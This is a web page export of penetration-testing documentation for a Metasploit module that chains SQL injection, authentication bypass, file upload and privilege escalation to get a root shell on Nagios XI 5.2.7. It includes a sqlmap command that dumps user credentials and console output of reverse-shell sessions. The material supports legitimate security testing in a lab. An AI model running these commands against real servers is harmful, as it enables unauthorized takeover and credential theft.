{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/nagios_xi_chained_rce","result":{"data":{"moduleMetadataJson":{"id":"a53567d6-3b9c-57f8-93d4-2d27af7fedb1","name":"Nagios XI Chained Remote Code Execution","fullname":"exploit/linux/http/nagios_xi_chained_rce","description":"This module exploits an SQL injection, auth bypass, file upload,\n        command injection, and privilege escalation in Nagios XI <= 5.2.7\n        to pop a root shell.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/nagios_xi_chained_rce","documentationSlug":"/modules/documentation/exploit/linux/http/nagios_xi_chained_rce"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>Nagios XI is the enterprise version of Nagios, the monitoring software we love\nand hate.</p>\n<blockquote>\n<p>This module exploits an SQL injection, auth bypass, file upload, command\ninjection, and privilege escalation in Nagios XI &#x3C;= 5.2.7 to pop a root shell.</p>\n</blockquote>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<p><strong>Download the virtual appliance:</strong></p>\n<p>I used the 64-bit OVA <a href=\"https://assets.nagios.com/downloads/nagiosxi/5/ovf/nagiosxi-5.2.7-64.ova\">here</a>. Remove the \"-64\" in the link to download the\n32-bit OVA.</p>\n<p><strong>Import the OVA:</strong></p>\n<p>Just import it into VMware or VirtualBox. It should create a VM for you.</p>\n<p><strong>Configure the software:</strong></p>\n<p>When you start the VM, you will see <code class=\"language-text\">Access Nagios XI at http://[redacted]</code>\non the login screen. Connect to the URL using your web browser and follow the\nsteps on the screen to configure the app.</p>\n<p>Configuration is actually not required to exploit the app, but you should do it\nanyway.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>USER_ID</strong></p>\n<p>  If you wish to exploit a particular <code class=\"language-text\">USER_ID</code>, that can be specified here.  Default is 1, which is most likely the admin account.</p>\n<p>  <strong>API_TOKEN</strong></p>\n<p>  The SQLi included only works for MySQL, which should work in most cases.  However, if you experience a different backend, you can enumerate the user\ntable via sqlmap: <code class=\"language-text\">sqlmap -u &quot;http://[ip]/nagiosxi/includes/components/nagiosim/nagiosim.php?mode=resolve&amp;host=a&amp;service=&quot; -p service -T xi_users --dump</code>.\nThen you can set the <code class=\"language-text\">USER_ID</code> and <code class=\"language-text\">API_TOKEN</code> to skip those phases and move on to exploitation.  Default is empty.  See example below for more usage.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<h3 id=\"typical-usage\" style=\"position:relative;\"><a href=\"#typical-usage\" aria-label=\"typical usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Typical Usage</h3>\n<p>Just set <code class=\"language-text\">RHOST</code> and fire off the module! It's pretty much painless.\n<code class=\"language-text\">set VERBOSE true</code> if you want to see details.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/nagios_xi_chained_rce \nmsf exploit(nagios_xi_chained_rce) &gt; set rhost [redacted]\nrhost =&gt; [redacted]\nmsf exploit(nagios_xi_chained_rce) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(nagios_xi_chained_rce) &gt; run\n\n[*] Started reverse TCP handler on [redacted]:4444 \n[*] Nagios XI version: 5.2.7\n[*] Getting API token\n[+] API token: 3o2erpm0\n[*] Getting admin cookie\n[+] Admin cookie: nagiosxi=jcilcfptj7ogpvovgs3i5gilh7;\n[+] CSRF token: 477abd7db8d06ade9c7fcd9e405fd911\n[*] Getting monitored host\n[+] Monitored host: localhost\n[*] Downloading component\n[*] Uploading root shell\n[*] Popping shell!\n[*] Command shell session 1 opened ([redacted]:4444 -&gt; [redacted]:60132) at 2016-07-01 00:12:20 -0500\n[*] Cleaning up...\n[*] rm -rf ../profile\n[*] unzip -qd .. ../../../../tmp/component-profile.zip\n[*] chown -R nagios:nagios ../profile\n[*] rm -f ../../../../tmp/component-xAmhUGRn.zip\n\n3904334783\nTwMSxKhKEaxUjlTSNYyeICVUuPSNkwoI\ncKKdfdZxRpDduZCezKXOficrVyNeVggH\nmRVdstQmfdtnFiYMjLgyfvRWXyQZPyUF\ndDlRoqhBvqvwrhKYWumimyKxVHSbrkoE\nwjCWBTgbsQuPemhiByeMpMEhdPooHEvw\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\nuname -a\nLinux localhost.localdomain 2.6.32-573.22.1.el6.x86_64 #1 SMP Wed Mar 23 03:35:39 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"emulating-a-different-db\" style=\"position:relative;\"><a href=\"#emulating-a-different-db\" aria-label=\"emulating a different db permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Emulating a different DB</h3>\n<h4 id=\"first-well-attempt-the-exploit-and-see-what-happens\" style=\"position:relative;\"><a href=\"#first-well-attempt-the-exploit-and-see-what-happens\" aria-label=\"first well attempt the exploit and see what happens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>First we'll attempt the exploit and see what happens.</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(nagios_xi_chained_rce) &gt; show options\n\nModule options (exploit/linux/http/nagios_xi_chained_rce):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   API_TOKEN                   no        If an API token was already stolen, skip the SQLi\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST      192.168.2.218    yes       The target address\n   RPORT      80               yes       The target port\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   USER_ID    1                yes       User ID in the database to target\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (cmd/unix/reverse_bash):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.2.117    yes       The listen address\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Nagios XI &lt;= 5.2.7\n\n\nmsf exploit(nagios_xi_chained_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Nagios XI version: 5.2.7\n[*] Getting API token\n[+] 0 incidents resolved in Nagios IM\n\n[-] Exploit aborted due to failure: unexpected-reply: API token not found! punt!\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"now-lets-try-using-sqlmap-to-enumerate-the-user-table\" style=\"position:relative;\"><a href=\"#now-lets-try-using-sqlmap-to-enumerate-the-user-table\" aria-label=\"now lets try using sqlmap to enumerate the user table permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Now lets try using sqlmap to enumerate the user table.</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@k:~# sqlmap -u &quot;http://192.168.2.218/nagiosxi/includes/components/nagiosim/nagiosim.php?mode=resolve&amp;host=a&amp;service=&quot; -p service -T xi_users --dump\n...snip...\nDatabase: nagiosxi\nTable: xi_users\n[2 entries]\n+---------+----------------------+-------------------+---------+-------------+----------------------------------+------------------------------------------------------------------+\n| user_id | name                 | email             | enabled | username    | password                         | backend_ticket                                                   |\n+---------+----------------------+-------------------+---------+-------------+----------------------------------+------------------------------------------------------------------+\n| 2       | admin2               | admin2@admin2.com | 1       | admin2      | c84258e9c39059a89ab77d846ddab909 | 8ftgcj2jubs8nrjnlga0ssakeen4ij8p339cl8shgom7kau7n86j3d6grsidgp6g |\n+---------+----------------------+-------------------+---------+-------------+----------------------------------+------------------------------------------------------------------+\n\n...snip...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"re-target\" style=\"position:relative;\"><a href=\"#re-target\" aria-label=\"re target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Re-target</h4>\n<p>Now, we can set the <code class=\"language-text\">USER_ID</code> and <code class=\"language-text\">API_TOKEN</code> (backend_ticket)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(nagios_xi_chained_rce) &gt; set USER_ID 2\nUSER_ID =&gt; 2\nmsf exploit(nagios_xi_chained_rce) &gt; set API_TOKEN 8ftgcj2jubs8nrjnlga0ssakeen4ij8p339cl8shgom7kau7n86j3d6grsidgp6g\nAPI_TOKEN =&gt; 8ftgcj2jubs8nrjnlga0ssakeen4ij8p339cl8shgom7kau7n86j3d6grsidgp6g\nmsf exploit(nagios_xi_chained_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[*] Nagios XI version: 5.2.7\n[*] Getting admin cookie\n[+] Admin cookie: nagiosxi=rjs4f9k4299v78hpgq3374q6j6;\n[+] CSRF token: c53d1f591264a3ea771639a7782627f8\n[*] Getting monitored host\n[+] Monitored host: localhost\n[*] Downloading component\n[*] Uploading root shell\n[*] Popping shell!\n[*] Command shell session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.218:51032) at 2016-10-10 10:15:08 -0400\n[*] Cleaning up...\n[*] rm -rf ../profile\n[*] unzip -qd .. ../../../../tmp/component-profile.zip\n[*] chown -R nagios:nagios ../profile\n[*] rm -f ../../../../tmp/component-ZEaGkiTW.zip\n\n1138255764\nNXEqynCVIfLzvpjUkqOovFvuLgsUrtpo\nCKorOSWlTQEkRoiwCiBqTgylyLQjuWxU\noIGZxLofAStLsgsMNaGnQzzMuBYpJUQs\nfkUlWzVvhurgAATtxKhLSBFCxQaZqjtR\nQajRDDToeigHGMFdUbaClxkLfJbxqBKv\nwhoami\nroot</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a53567d6-3b9c-57f8-93d4-2d27af7fedb1"}}}